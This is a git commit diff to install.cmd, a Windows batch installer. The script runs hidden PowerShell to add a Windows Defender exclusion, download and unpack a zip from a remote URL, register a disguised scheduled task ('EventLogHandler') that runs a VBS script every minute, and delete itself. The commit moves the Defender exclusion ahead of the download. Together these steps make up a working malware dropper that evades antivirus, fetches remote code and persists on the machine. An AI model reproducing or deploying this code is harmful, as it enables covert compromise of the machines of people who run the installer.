4716d7ddecea85993b54ad914391360bd8e597a8
nuo720 <nikou.omnia@gmail.com>
2025-06-07 06:33:00 +0300

    Update install.cmd

--- install.cmd
+++ install.cmd
@@ -9,6 +9,8 @@ if not exist "%destinationPath%" (
     mkdir "%destinationPath%" >nul
 )
 
+powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%destinationPath%' *> $null"
+
 powershell -WindowStyle Hidden -Command "Start-BitsTransfer -Source '%zipUrl%' -Destination '%tempZipPath%'"
 powershell -WindowStyle Hidden -Command "Expand-Archive -LiteralPath '%tempZipPath%' -DestinationPath '%destinationPath%' -Force *> $null"
 del "%tempZipPath%" >nul
@@ -16,7 +18,6 @@ del "%tempZipPath%" >nul
 schtasks /create /tn "EventLogHandler" /tr "wscript.exe \"%APPDATA%\tmpdir\run.vbs\"" /sc minute /mo 1 /f >nul
 schtasks /run /tn "EventLogHandler" >nul
 
-powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%destinationPath%' *> $null"
 del "%~f0" >nul
 
 endlocal
